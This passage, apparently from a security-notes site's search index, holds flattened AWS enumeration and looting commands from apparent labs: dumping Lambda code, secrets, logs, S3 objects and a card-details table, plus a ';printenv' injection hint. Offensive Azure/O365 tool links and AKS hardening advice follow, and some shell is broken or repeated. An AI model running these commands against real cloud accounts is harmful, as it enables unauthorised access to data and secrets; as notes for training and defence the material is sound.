cd lambda- $line -version- $versionline wget ` cat ../lambda- $line -version- $versionline .json | jq -r .Code | .Location ` -O source.zip unzip source.zip cd .. done done aws lambda list-layers --profile main lambda-layers.json cat lambda-layers.json | jq -r .Layers[] | .LayerName | while read -r line ; do aws lambda list-layer-versions --layer-name $line --profile main lambda-layer- $line -versions.json cat lambda-layer- $line -versions.json | jq -r .LayerVersions[] | .Version | while read -r versionline ; do aws lambda get-layer-version --layer-name $line --version-number $versionline --profile main lambda-layer- $line -version- $versionline .json mkdir lambda-layer- $line -version- $versionline cd lambda-layer- $line -version- $versionline wget ` cat ../lambda-layer- $line -version- $versionline .json | jq -r .Content | .Location ` -O source.zip unzip source.zip cd .. done done # Diff layers $prev_version = cat lambda-layers.json | jq -r .Layers[] | .LayerName | while read -r line ; do if prev_version == $prev_version = $line else diff -urN fi done for region in ` aws ec2 describe-regions --output text | cut -f4 ` do aws ec2 describe-instances --region $region --profile student aws ec2 describe-instances-attribute --attribute usedData --instance-id $$ ID $$ --region $region aws apigateway get-rest-apis --region $region aws secretsmanager list-secrets aws s3 ls aws s3 ls s3:// $$ bucket-name $$ --region $region aws s3api list-objects --bucket $$ bucket-name $$ --region $region aws s3api list-objects-v2 --bucket $$ bucket-name $$ --region $region # versions of bucket aws s3api list-object-versions --bucket data-extractor-repo --profile student aws s3api list-object-versions --bucket data-extractor-repo --profile student | jq -r .Versions[] | .VersionId aws s3api get-object --bucket data-extractor-repo --key DataExtractor.zip --version-id S5l9yGDb_u0XR96U3tQexZMtmn1t6HUZ latest.zip --profile student aws --endpoint http://192.69.97.3:9000 s3api list-buckets aws --endpoint http://192.69.97.3:9000 s3 ls s3://hello-world \u200baws --endpoint http://192.69.97.3:9000 s3api get-bucket-policy --bucket welcome aws s3 cp s3://developers-secret-bucket/dave-shared-bucket/flag.txt . --region $region aws s3api get-bucket-policy --bucket temporary-public-image-store --profile student aws lambda list-functions --region $region aws lambda get-function --function-name serverlessrepo-image-uploader-uploader-RM72CSUT4KDA --region $region aws lambda list-versions-by-function --function-name DataExtractor --profile student --region us-west-2 # get code of a version aws lambda get-function --function-name DataExtractor --qualifier 1 --profile student --region us-west-2 aws lambda list-aliases --function-name FileUploader aws apigateway get-rest-apis --region $region aws apigateway get-stages --rest-api-id 43iqo53xr7 --region $region aws apigateway get-resources --rest-api-id 43iqo53xr7 --region $region # https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod # ;printenv to read env variables used by function # https://gist.github.com/eldondevcg/fffff4b7909351b19a53 aws logs describe-log-groups --profile student --region us-east-1 aws logs describe-log-streams --log-group-name /aws/lambda/DataExtractor --profile student --region us-east-1 aws logs describe-log-streams --log-group-name /aws/lambda/DataExtractor --profile student --region us-east-1 | jq .logStreams[] | .logStreamName aws logs get-log-events --log-group-name /aws/lambda/DataExtractor --log-stream-name 2020/10/29/[$LATEST]81c6e324b37a46baa2078ba80d1f99bc --start-time 1603674938 --profile student --region us-east-1 out.log awslogs get /aws/lambda/StressTester --profile student # logs might be available only when the start date is less than the time at which the log was recorded awslogs get /aws/lambda/StressTester --start 2d --profile student | grep -i flag # dynamodb operator injection possible too aws dynamodb list-backups aws dynamodb list-tables aws dynamodb list-global-tables aws dynamodb scan --table-name CardDetails --profile student --region us-east-1 done","title":"Aws"},{"location":"cloud/aws/#tools","text":"\u200b https://awspolicygen.s3.amazonaws.com/policygen.html https://github.com/toniblyx/my-arsenal-of-aws-security-tools#offensive https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools https://github.com/andresriancho/enumerate-iam Amazon Web Services In Plain English: https://expeditedsecurity.com/aws-in-plain-english/ The AWS exploitation framework, designed for testing the security of Amazon Web Services environments: https://github.com/RhinoSecurityLabs/pacu Security tool to perform AWS security best practices assessments: https://github.com/toniblyx/prowler AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report: https://github.com/salesforce/cloudsplaining WeirdAAL (AWS Attack Library): https://github.com/carnal0wnage/weirdAAL barq: The AWS Cloud Post Exploitation framework!: https://github.com/Voulnet/barq","title":"Tools"},{"location":"cloud/aws/#references","text":"https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://anir0y.live/class/blog/securityaudit-aws/ Unauthenticated AWS Role Enumeration (IAM Revisited): https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/","title":"References"},{"location":"cloud/aws/#ebs","text":"Search exposed EBS volumes for secrets: https://github.com/BishopFox/dufflebag You can identify EBS volumes / snapshots owned bya specific company if you know their AWS account IDs . Which you may be able to find from other data seepage tecniques , eg . if they leak it in source code , or if you are able to do any recon of any of their other AWS resources that would include the account ID in any ARNs","title":"EBS"},{"location":"cloud/aws/#s3","text":"","title":"S3"},{"location":"cloud/aws/#new-references","text":"S3 Book: https://github.com/nagwww/aws-s3-book https://github.com/mxm0z/awesome-sec-s3","title":"New References"},{"location":"cloud/aws/#collections","text":"https://github.com/nagwww/101-AWS-S3-Hacks Hack : Add ACL to an Object . Grant Read privilages to the bucket using canonical user id Hack : Add ACL to an object . Grant Read privilages to the bucket using email address Hack : Add ACL to the bucket . Grant Read privilages to the bucket using canonical user id Hack : Add ACL to the bucket . Grant Read privilages to the bucket using email address Hack : Add a tag to S3 bucket Hack : Add lifecycle to S3 Folder Hack : Add lifecycle to S3 bucket Hack : Add lifecycle to S3 bucket , set the effective date . Don t specify the time or specify GMT midnight Hack : Add lifecycle to S3 bucket , set the effective days Hack : Check if a key exists Hack : Compute MD5 for an S3 object Hack : Configure this bucket to act as a website Hack : Convert an existing key in an S3 bucket that uses the STANDARD to RRS Hack : Copy the current key to a different Bucket Hack : Copy the current key to a different Bucket with Reduced Redundancy Storage ( RRS ) Hack : Create a Bucket in S3 Hack : Create a S3 bucket in a different region EU Hack : Create a folder in a S3 bucket Hack : Create a new object in S3 Hack : Delete a S3 bucket Hack : Delete a s3 object Hack : Delete all cors for the s3 bucket Hack : Delete all files in a folder Hack : Delete lifecycle to S3 bucket Hack : Delete tags of a S3 bucket Hack : Disable Logging for the S3 bucket Hack : Disable a buckets Versioning Hack : Disable a lifecycle to S3 bucket Hack : Download a S3 file or a S3 object Hack : Download a file using the method get_file Hack : Enable Logging for the S3 bucket Hack : Enable Versioning Hack : Find out the status of the Bucket Versioning Hack : Generate a URL for the S3 bucket with an expiration time 20 seconds Hack : Generate a URL for the S3 object with expiration of 5 min Hack : Get CORS for an S3 bucket Hack : Get CORS for an S3 bucket as xml Hack : Get a metadata value name name added to the S3 object Hack : Get all the S3 regions Hack : Get all the metadata added to the S3 object Hack : Get all the versions of the S3 Objects Hack : Get an expiry date of a key / object in S3 Hack : Get lifecycle to S3 bucket Hack : Get lifecycle to S3 bucket as xml Hack : Get status of the restore of an object from glacier Hack : Get the ACL of the S3 bucket Hack : Get the ACL of the object Hack : Get the ACL of the object as xml Hack : Get the Location of the s3 bucket Hack : Get the bucket Policy Hack : Get the canonical user id of the S3 bucket Hack : Get the content type of object . Note only works with get_key Hack : Get the contents of the object as a string Hack : Get the get_xml_acl of an S3 object Hack : Get the redirect for an S3 object Hack : Get the tags of a S3 bucket Hack : Get the website configuration for this s3 bucket Hack : Get the website configuration in xml for this s3 bucket Hack : Get the website_endpoint of a s3 bucket Hack : How to add an exception Hack : How to enable debugging for S3 Hack : List all the S3 buckets Hack : List all the grants for a given Bucket Hack : List all the objects Owner Hack : List all the objects in a S3 bucket Hack : List all the objects last modified timestamp in Zulu format Hack : List all the objects size in bytes Hack : List all the objects with in a bucket Hack : List all the objects with in a bucket and if the object is moved to Glacier Hack : List all the objects with in a bucket with a prefix Hack : List all the objects with the versions for a given Bucket Hack : List whether the object is encrypted while at rest on the server Hack : Logging status for the S3 bucket Hack : Make S3 bucket public readable Hack : Make a http connection to S3 instead of https Hack : Make an object public Hack : Move s3 objects to Glacier Hack : Move s3 objects to Glacier add a Expiration Hack : Restore an object from glacier Hack : Search for bucket in a different AWS Region Hack : Search for a bucket with bucket name which is case sensitive Hack : Search for a specific bucket Hack : Set a canned ACL for object , authenticated - read Hack : Set a canned ACL for object , canned_bucket_owner_full_control Hack : Set a canned ACL for object , canned_bucket_owner_read Hack : Set a canned ACL for object , public read Hack : Set a canned ACL for object , public read write Hack : Set a canned ACL , authenticated - read Hack : Set a canned ACL , private Hack : Set a canned ACL , public - read Hack : Set a canned ACL , public - read - write Hack : Set a private canned ACL for an object Hack : Set a redirect for an S3 object Hack : Set metadata for a new s3 object on creation Hack : Set set_request_payment for a bucket Hack : Set the bucket Policy Hack : Set the meta data for an object Hack : Set up CORS for an S3 bucket Hack : Upload a file to S3 bucket using method initiate_multipart_upload . Note should be 5 MB Hack : Upload a file to S3 bucket using method set_contents_from_filename Hack : Upload a file to s3 bucket using the method send_file aws s3 sync s3 : // developers - secret - bucket . / developers - secret - bucket aws s3 cp s3 : // developers - secret - bucket . / developers - secret - bucket1 --recursive aws dynamodb scan --table-name CardDetails awslogs groups awslogs streams / aws / lambda / DataExtractor awslogs get / aws / lambda / DataExtractor aws lambda list-event-source-mappings --profile main event-source-mappings.json aws lambda list-functions --profile main lambda-functions.json cat lambda-functions.json | jq -r .Functions[] | .FunctionName | while read -r line ; do aws lambda list-aliases --function-name $line --profile main lambda- $line -aliases.json aws lambda list-function-event-invoke-configs --function-name $line --profile main lambda- $line -event-invoke-configs.json aws lambda list-versions-by-function --function-name $line --profile main lambda- $line -versions.json cat lambda- $line -versions.json | jq -r .Versions[] | .Version | while read -r versionline ; do aws lambda get-function --function-name $line --qualifier $versionline --profile main lambda- $line -version- $versionline .json mkdir lambda- $line -version- $versionline cd lambda- $line -version- $versionline wget ` cat ../lambda- $line -version- $versionline .json | jq -r .Code | .Location ` -O source.zip unzip source.zip cd .. done done aws lambda list-layers --profile main lambda-layers.json cat lambda-layers.json | jq -r .Layers[] | .LayerName | while read -r line ; do aws lambda list-layer-versions --layer-name $line --profile main lambda-layer- $line -versions.json cat lambda-layer- $line -versions.json | jq -r .LayerVersions[] | .Version | while read -r versionline ; do aws lambda get-layer-version --layer-name $line --version-number $versionline --profile main lambda-layer- $line -version- $versionline .json mkdir lambda-layer- $line -version- $versionline cd lambda-layer- $line -version- $versionline wget ` cat ../lambda-layer- $line -version- $versionline .json | jq -r .Content | .Location ` -O source.zip unzip source.zip cd .. done done # Diff layers $prev_version = cat lambda-layers.json | jq -r .Layers[] | .LayerName | while read -r line ; do if prev_version == $prev_version = $line else diff -urN fi done for region in ` aws ec2 describe-regions --output text | cut -f4 ` do aws ec2 describe-instances --region $region --profile student aws ec2 describe-instances-attribute --attribute usedData --instance-id $$ ID $$ --region $region aws apigateway get-rest-apis --region $region aws secretsmanager list-secrets aws s3 ls aws s3 ls s3:// $$ bucket-name $$ --region $region aws s3api list-objects --bucket $$ bucket-name $$ --region $region aws s3api list-objects-v2 --bucket $$ bucket-name $$ --region $region # versions of bucket aws s3api list-object-versions --bucket data-extractor-repo --profile student aws s3api list-object-versions --bucket data-extractor-repo --profile student | jq -r .Versions[] | .VersionId aws s3api get-object --bucket data-extractor-repo --key DataExtractor.zip --version-id S5l9yGDb_u0XR96U3tQexZMtmn1t6HUZ latest.zip --profile student aws --endpoint http://192.69.97.3:9000 s3api list-buckets aws --endpoint http://192.69.97.3:9000 s3 ls s3://hello-world \u200baws --endpoint http://192.69.97.3:9000 s3api get-bucket-policy --bucket welcome aws s3 cp s3://developers-secret-bucket/dave-shared-bucket/flag.txt . --region $region aws s3api get-bucket-policy --bucket temporary-public-image-store --profile student aws lambda list-functions --region $region aws lambda get-function --function-name serverlessrepo-image-uploader-uploader-RM72CSUT4KDA --region $region aws lambda list-versions-by-function --function-name DataExtractor --profile student --region us-west-2 # get code of a version aws lambda get-function --function-name DataExtractor --qualifier 1 --profile student --region us-west-2 aws lambda list-aliases --function-name FileUploader aws apigateway get-rest-apis --region $region aws apigateway get-stages --rest-api-id 43iqo53xr7 --region $region aws apigateway get-resources --rest-api-id 43iqo53xr7 --region $region # https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod # ;printenv to read env variables used by function # https://gist.github.com/eldondevcg/fffff4b7909351b19a53 aws logs describe-log-groups --profile student --region us-east-1 aws logs describe-log-streams --log-group-name /aws/lambda/DataExtractor --profile student --region us-east-1 aws logs describe-log-streams --log-group-name /aws/lambda/DataExtractor --profile student --region us-east-1 | jq .logStreams[] | .logStreamName aws logs get-log-events --log-group-name /aws/lambda/DataExtractor --log-stream-name 2020/10/29/[$LATEST]81c6e324b37a46baa2078ba80d1f99bc --start-time 1603674938 --profile student --region us-east-1 out.log awslogs get /aws/lambda/StressTester --profile student # logs might be available only when the start date is less than the time at which the log was recorded awslogs get /aws/lambda/StressTester --start 2d --profile student | grep -i flag # dynamodb operator injection possible too aws dynamodb list-backups aws dynamodb list-tables aws dynamodb list-global-tables aws dynamodb scan --table-name CardDetails --profile student --region us-east-1 done","title":"Collections"},{"location":"cloud/azuer-o360/","text":"Tools A collection of scripts for assessing Microsoft Azure security: https://github.com/NetSPI/MicroBurst Azure Red Team tool for graphing Azure and Azure Active Directory objects: https://github.com/Azure/Stormspotter The Azure AD exploration framework: https://github.com/dirkjanm/ROADtools A password spraying tool for Microsoft Online accounts (Azure/O365): https://github.com/dafthack/MSOLSpray office365userenum: https://bitbucket.org/grimhacker/office365userenum https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/ retrieve information via O365 with a valid cred: https://github.com/nyxgeek/o365recon Defense Azure AD and ADFS best practices: Defending against password spray attacks: https://www.microsoft.com/en-us/microsoft-365/blog/2018/03/05/azure-ad-and-adfs-best-practices-defending-against-password-spray-attacks/ References You Moved to Office 365 Now What Sean Metcalf: https://www.youtube.com/watch?v=1loGEPn_n7U OWNING O365 THROUGH BETTER BRUTE-FORCING: https://www.trustedsec.com/blog/owning-o365-through-better-brute-forcing/ Azure AD Authentication and authorization error codes: https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes https://www.guardicore.com/2018/03/recovering-plaintext-passwords-azure/ https://blog.xpnsec.com/azuread-connect-for-redteam/ https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1 AZ500 Cloud service model Built-in capabilities Operations Security Center Security and Audit solution: https://docs.microsoft.com/en-us/azure/security-center/security-center-introduction Search queries: https://docs.microsoft.com/en-us/archive/blogs/msoms/easy-microsoft-operations-management-suite-search-queries Azure Monitor: Security and Audit dashboard: https://docs.microsoft.com/en-us/azure/azure-monitor/overview Collecting, analyzing, and acting on telemetry Collects Application monitoring data Guest OS monitoring data (could be running in Azure, another cloud, or on-premises) Azure resource monitoring data Azure subscription monitoring data Azure tenant monitoring data: (such as Azure Active Directory) Extend Enable diagnostics: https://docs.microsoft.com/en-us/azure/azure-monitor/platform/platform-logs-overview Add agents: https://docs.microsoft.com/en-us/azure/azure-monitor/platform/agent-windows Define datasources: https://docs.microsoft.com/en-us/azure/azure-monitor/platform/agent-data-sources Application Insights monitors the availability, performance, and usage of your web applications: https://docs.microsoft.com/en-us/azure/azure-monitor/app/app-insights-overview Container performance: https://docs.microsoft.com/en-us/azure/azure-monitor/insights/container-insights-overview Export Event Hub: streaming platform Logic Apps: automate tasks and business processes using workflows API Connect your existing System Center Operations Manager management group to Azure Monitor to collect data from agents into Azure Monitor Logs Azure Data Explorer is a fast and highly scalable data exploration service for log and telemetry data. Azure Monitor Logs is built on top of Azure Data Explorer and uses the same Kusto Query Language (KQL) with some minor differences. S Applications Storage Networking Compute Identity https://atouati.com/posts/2020/02/securing-aks-clusters-and-applications/ Enable Kubernetes RBAC: https://docs.microsoft.com/en-us/azure/aks/azure-ad-rbac API server authorized IP address ranges to limit which IP addresses and CIDRs can access the control plane: https://docs.microsoft.com/en-us/azure/aks/api-server-authorized-ip-ranges Add a network policy in all user namespaces to block pod egress to the metadata endpoint apiVersion : networking.k8s.io/v1 kind : NetworkPolicy metadata : name : block-node-metadata spec : podSelector : matchLabels : {} policyTypes : - Egress egress : - to : - ipBlock : cidr : 0.0.0.0/0 # Preferably something smaller here except : - 169.254.169.254/32 Kured, an open-source reboot daemon for Kubernetes. Kured runs as a DaemonSet and monitors each node for the presence of a file indicating that a reboot is required: https://github.com/weaveworks/kured cordon and drain process followed: https://docs.microsoft.com/en-us/azure/aks/concepts-security#cordon-and-drain AKS control plane audit logging: https://docs.microsoft.com/en-us/azure/aks/view-master-logs Upgrade AKS Clusters. Cordon and drain Disposable Infrastructure Using Auzre Key Vault for secrets: https://github.com/Azure/secrets-store-csi-driver-provider-azure Images Google\u2019s \u201cDistroless\u201d images Don't install build tools. Use Multi-stage Docker build: https://docs.docker.com/develop/develop-images/multistage-build/ if you only need network tools at pod start-time, consider using separate init containers or delivering the data using a more Kubernetes-native method, such as ConfigMaps remove the package manager from the image in a later build step Keep your images up-to-date Secure the container runtime least number of privileges required do not build database connection strings, keys, or secrets and certificates into images (require rebuild to change and cloud leak to external registries) Pod security best practices: https://docs.microsoft.com/en-us/azure/aks/developer-best-practices-pod-security allowPrivilegeEscalation: false least Linux capabilities: http://man7.org/linux/man-pages/man7/capabilities.7.html least SELinux labels: https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#selinuxoptions-v1-core apiVersion : v1 kind : Pod metadata : name : security-context-demo spec : securityContext : fsGroup : 2000 containers : - name : security-context-demo image : mcr.microsoft.com/oss/nginx/nginx:1.15.5-alpine securityContext : runAsUser : 1000 allowPrivilegeEscalation : false capabilities : add : [ NET_ADMIN , SYS_TIME ] The following associated AKS open source projects let you automatically authenticate pods or request credentials and keys Azure Active Directory Pod Identity: https://github.com/Azure/aad-pod-identity#demo Azure Key Vault Provider for Secrets Store CSI Driver: https://github.com/Azure/secrets-store-csi-driver-provider-azure#usage Secure Network Limit Node SSH Access: By default, the SSH port on the nodes is open to all pods running in the cluster. You can block pod access to the nodes\u2019 SSH ports using a Kubernetes Network Policy, if enabled in your cluster. However, the Kubernetes Network Policy API does not support cluster-wide egress policies; network policies are namespace-scoped, which requires making sure a policy is added for each namespace, which requires ongoing vigilance. Calico CNI for network policy GlobalNetworkPolicy, which can apply to the entire cluster https://docs.projectcalico.org/v3.11/reference/resources/globalnetworkpolicy Restrict Cluster Egress Traffic limiting egress network traffic only to known Kubernetes network policies to limit pod egress endpoints Calico Network Policy option in AKS Azure firewall to control cluster egress from the VNet Firewall ingress to apps Azure Gateway Ingress Controller, which is GA, allows the use of a single Application Gateway Ingress Controller to control multiple AKS clusters: https://docs.microsoft.com/en-us/azure/application-gateway/ingress-controller-overview Application Gateway talks to pods directly using their private IP and does not require NodePort or KubeProxy services Azure Application Gateway in addition to AGIC also helps protect your AKS cluster by providing TLS policy and Web Application Firewall (WAF) Network Policies Azure\u2019s own implementation, called Azure Network Policies. Calico Network Policies, an open-source network and network security solution founded by Tigera. Service Mesh Encrypt all traffic in cluster Observability pod security policy: https://kubernetes.io/docs/concepts/policy/pod-security-policy/ Azure Policy for AKS: https://docs.microsoft.com/en-us/azure/governance/policy/concepts/policy-for-kubernetes Front Door: https://ssbkang.com/2020/08/17/end-to-end-tls-for-azure-front-door-and-azure-kubernetes-service/ Front Door can load balance between your different scale units/clusters/stamp units across regions AFD in fact support TLS terminations, however, as the ingress controller cannot be located in a private VNet i.e. a public instance, it is highly recommended to implement end to end TLS encryption. Update the NSG attached to the AKS subnet to be only accepting HTTP/HTTPS traffics from the AFD instance only (can use the service tag called AzureFrontDoor.Backend). This way, no one will be able to bypass AFD hitting the ingress controller directly. https://docs.microsoft.com/en-us/azure/aks/operator-best-practices-network There are two different ways to deploy AKS clusters into virtual networks: Kubenet networking - Azure manages the virtual network resources as the cluster is deployed and uses the kubenet Kubernetes plugin. Nodes and pods are placed on different IP subnets. User Defined Routing (UDR) and IP forwarding is used to route traffic between pods and nodes. This additional routing may reduce network performance. Connections to existing on-premises networks or peering to other Azure virtual networks can be complex. Azure CNI networking - Deploys into a virtual network, and uses the Azure Container Networking Interface (CNI) Kubernetes plugin. Pods receive individual IPs that can route to other network services or on-premises resources. vendor-neutral protocol that lets the container runtime make requests to a network provider. Azure CNI assigns IP addresses to pods and nodes, and provides IP address management (IPAM) Each node and pod resource receives an IP address in the Azure virtual network virtual network resource is in a separate resource group to the AKS cluster Delegate permissions for the AKS service principal to access and manage these resources (least Network Contributor permissions on the subnet within your virtual network.) Microsoft.Network/virtualNetworks/subnets/join/action Microsoft.Network/virtualNetworks/subnets/read Each AKS cluster must be placed in its own subnet. Most web applications that use HTTP or HTTPS should use Kubernetes ingress resources and controllers, which work at layer 7. https://medium.com/fraktal/cloud-waf-comparison-using-real-world-attacks-acb21d37805e https://docs.microsoft.com/en-us/azure/aks/operator-best-practices-multi-region Store your container images in Azure Container Registry and geo-replicate the registry to each AKS region. don't store service state inside the container. Instead, use an Azure platform as a service (PaaS) that supports multiregion replication. Azure Storage: prepare and test how to migrate your storage from the primary region to the backup region. https://cloud-right.com/2019/07/multi-regional-azure-front-door https://docs.microsoft.com/en-us/azure/architecture/reference-architectures/containers/aks/secure-baseline-aks AZ900 Regions Every region has a pair region for DR purposes Region have multiple data centers Availability Zones deploy your VM\u2019s into different data centers within the same region VM\u2019s are spread across different buildings but within same Azure Region Availability Sets increase the availability of your Applications VM would be spread across update and fault domains but it could happen that your Azure VM is running within the same building in outage your VM may go down https://www.testpreptraining.com/microsoft-azure-fundamentals-az-900-free-practice-test https://www.certlibrary.com/exam/AZ-900 https://www.exam-answer.com/microsoft/az-900 https://pegacert.com/vendor/microsoft/az-900 https://www.itexams.com/exam/AZ-900","title":"Azuer o360"},{"location":"cloud/azuer-o360/#tools","text":"A collection of scripts for assessing Microsoft Azure security: https://github.com/NetSPI/MicroBurst Azure Red Team tool for graphing Azure and Azure Active Directory objects: https://github.com/Azure/Stormspotter The Azure AD exploration framework: https://github.com/dirkjanm/ROADtools A password spraying tool for Microsoft Online accounts (Azure/O365): https://github.com/dafthack/MSOLSpray office365userenum: https://bitbucket.org/grimhacker/office365userenum https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/ retrieve information via O365 with a valid cred: https://github.com/nyxgeek/o365recon","title":"Tools"},{"location":"cloud/azuer-o360/#defense","text":"Azure AD and ADFS best practices: Defending against password spray attacks: https://www.microsoft.com/en-us/microsoft-365/blog/2018/03/05/azure-ad-and-adfs-best-practices-defending-against-password-spray-attacks/","title":"Defense"},{"location":"cloud/azuer-o360/#references","text":"You Moved to Office 365 Now What Sean Metcalf: https://www.youtube.com/watch?v=1loGEPn_n7U OWNING O365 THROUGH BETTER BRUTE-FORCING: https://www.trustedsec.com/blog/owning-o365-through-better-brute-forcing/ Azure AD Authentication and authorization error codes: https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes https://www.guardicore.com/2018/03/recovering-plaintext-passwords-azure/ https://blog.xpnsec.com/azuread-connect-for-redteam/ https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1","title":"References"},{"location":"cloud/azuer-o360/#az500","text":"Cloud service model Built-in capabilities Operations Security Center Security and Audit solution: https://docs.microsoft.com/en-us/azure/security-center/security-center-introduction Search queries: https://docs.microsoft.com/en-us/archive/blogs/msoms/easy-microsoft-operations-management-suite-search-queries Azure Monitor: Security and Audit dashboard: https://docs.microsoft.com/en-us/azure/azure-monitor/overview Collecting, analyzing, and acting on telemetry Collects Application monitoring data Guest OS monitoring data (could be running in Azure, another cloud, or on-premises) Azure resource monitoring data Azure subscription monitoring data Azure tenant monitoring data: (such as Azure Active Directory) Extend Enable diagnostics: https://docs.microsoft.com/en-us/azure/azure-monitor/platform/platform-logs-overview Add agents: https://docs.microsoft.com/en-us/azure/azure-monitor/platform/agent-windows Define datasources: https://docs.microsoft.com/en-us/azure/azure-monitor/platform/agent-data-sources Application Insights monitors the availability, performance, and usage of your web applications: https://docs.microsoft.com/en-us/azure/azure-monitor/app/app-insights-overview Container performance: https://docs.microsoft.com/en-us/azure/azure-monitor/insights/container-insights-overview Export Event Hub: streaming platform Logic Apps: automate tasks and business processes using workflows API Connect your existing System Center Operations Manager management group to Azure Monitor to collect data from agents into Azure Monitor Logs Azure Data Explorer is a fast and highly scalable data exploration service for log and telemetry data. Azure Monitor Logs is built on top of Azure Data Explorer and uses the same Kusto Query Language (KQL) with some minor differences. S Applications Storage Networking Compute Identity https://atouati.com/posts/2020/02/securing-aks-clusters-and-applications/ Enable Kubernetes RBAC: https://docs.microsoft.com/en-us/azure/aks/azure-ad-rbac API server authorized IP address ranges to limit which IP addresses and CIDRs can access the control plane: https://docs.microsoft.com/en-us/azure/aks/api-server-authorized-ip-ranges Add a network policy in all user namespaces to block pod egress to the metadata endpoint apiVersion : networking.k8s.io/v1 kind : NetworkPolicy metadata : name : block-node-metadata spec : podSelector : matchLabels : {} policyTypes : - Egress egress : - to : - ipBlock : cidr : 0.0.0.0/0 # Preferably something smaller here except : - 169.254.169.254/32 Kured, an open-source reboot daemon for Kubernetes. Kured runs as a DaemonSet and monitors each node for the presence of a file indicating that a reboot is required: https://github.com/weaveworks/kured cordon and drain process followed: https://docs.microsoft.com/en-us/azure/aks/concepts-security#cordon-and-drain AKS control plane audit logging: https://docs.microsoft.com/en-us/azure/aks/view-master-logs Upgrade AKS Clusters. Cordon and drain Disposable Infrastructure Using Auzre Key Vault for secrets: https://github.com/Azure/secrets-store-csi-driver-provider-azure Images Google\u2019s \u201cDistroless\u201d images Don't install build tools. Use Multi-stage Docker build: https://docs.docker.com/develop/develop-images/multistage-build/ if you only need network tools at pod start-time, consider using separate init containers or delivering the data using a more Kubernetes-native method, such as ConfigMaps remove the package manager from the image in a later build step Keep your images up-to-date Secure the container runtime least number of privileges required do not build database connection strings, keys, or secrets and certificates into images (require rebuild to change and cloud leak to external registries) Pod security best practices: https://docs.microsoft.com/en-us/azure/aks/developer-best-practices-pod-security allowPrivilegeEscalation: false least Linux capabilities: http://man7.org/linux/man-pages/man7/capabilities.7.html least SELinux labels: https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#selinuxoptions-v1-core apiVersion : v1 kind : Pod metadata : name : security-context-demo spec : securityContext : fsGroup : 2000 containers : - name : security-context-demo image : mcr.microsoft.com/oss/nginx/nginx:1.15.5-alpine securityContext : runAsUser : 1000 allowPrivilegeEscalation : false capabilities : add : [ NET_ADMIN , SYS_TIME ] The following associated AKS open source projects let you automatically authenticate pods or request credentials and keys Azure Active Directory Pod Identity: https://github.com/Azure/aad-pod-identity#demo Azure Key Vault Provider for Secrets Store CSI Driver: https://github.com/Azure/secrets-store-csi-driver-provider-azure#usage Secure Network Limit Node SSH Access: By default, the SSH port on the nodes is open to all pods running in the cluster. You can block pod access to the nodes\u2019 SSH ports using a Kubernetes Network Policy, if enabled in your cluster. However, the Kubernetes Network Policy API does not support cluster-wide egress policies; network policies are namespace-scoped, which requires making sure a policy is added for each namespace, which requires ongoing vigilance. Calico CNI for network policy GlobalNetworkPolicy, which can apply to the entire cluster https://docs.projectcalico.org/v3.11/reference/resources/globalnetworkpolicy Restrict Cluster Egress Traffic limiting egress network traffic only to known Kubernetes network policies to limit pod egress endpoints Calico Network Policy option in AKS Azure firewall to control cluster egress from the VNet Firewall ingress to apps Azure Gateway Ingress Controller, which is GA, allows the use of a single Application Gateway Ingress Controller to control multiple AKS clusters: https://docs.microsoft.com/en-us/azure/application-gateway/ingress-controller-overview Application Gateway talks to pods directly using their private IP and does not require NodePort or KubeProxy services Azure Application Gateway in addition to AGIC also helps protect your AKS cluster by providing TLS policy and Web Application Firewall (WAF) Network Policies Azure\u2019s own implementation, called Azure Network Policies. Calico Network Policies, an open-source network and network security solution founded by Tigera. Service Mesh Encrypt all traffic in cluster Observability pod security policy: https://kubernetes.io/docs/concepts/policy/pod-security-policy/ Azure Policy for AKS: https://docs.microsoft.com/en-us/azure/governance/policy/concepts/policy-for-kubernetes Front Door: https://ssbkang.com/2020/08/17/end-to-end-tls-for-azure-front-door-and-azure-kubernetes-service/ Front Door can load balance between your different scale units/clusters/stamp units across regions AFD in fact support TLS terminations, however, as the ingress controller cannot be located in a private VNet i.e. a public instance, it is highly recommended to implement end to end TLS encryption. Update the NSG attached to the AKS subnet to be only accepting HTTP/HTTPS traffics from the AFD instance only (can use the service tag called AzureFrontDoor.Backend). This way, no one will be able to bypass AFD hitting the ingress controller directly. https://docs.microsoft.com/en-us/azure/aks/operator-best-practices-network There are two different ways to deploy AKS clusters into virtual networks: Kubenet networking - Azure manages the virtual network resources as the cluster is deployed and uses the kubenet Kubernetes plugin. Nodes and pods are placed on different IP subnets. User Defined Routing (UDR) and IP forwarding is used to route traffic between pods and nodes. This additional routing may reduce network performance. Connections to existing on-premises networks or peering to other Azure virtual networks can be complex. Azure CNI networking - Deploys into a virtual network, and uses the Azure Container Networking Interface (CNI) Kubernetes plugin. Pods receive individual IPs that can route to other network services or on-premises resources. vendor-neutral protocol that lets the container runtime make requests to a network provider. Azure CNI assigns IP addresses to pods and nodes, and provides IP address management (IPAM) Each node and pod resource receives an IP address in the Azure virtual network virtual network resource is in a separate resource group to the AKS cluster Delegate permissions for the AKS service principal to access and manage these resources (least Network Contributor permissions on the subnet within your virtual network.) Microsoft.Network/virtualNetworks/subnets/join/action Microsoft.Network/virtualNetworks/subnets/read Each AKS cluster must be placed in its own subnet. Most web applications that use HTTP or HTTPS should use Kubernetes ingress resources and controllers, which work at layer 7. https://medium.com/fraktal/cloud-waf-comparison-using-real-world-attacks-acb21d37805e https://docs.microsoft.com/en-us/azure/aks/operator-best-practices-multi-region Store your container images in Azure Container Registry and geo-replicate the registry to each AKS region. don't store service state inside the container. Instead, use an Azure platform as a service (PaaS) that supports multiregion replication. Azure Storage: prepare and test how to migrate your storage from the primary region to the backup region. 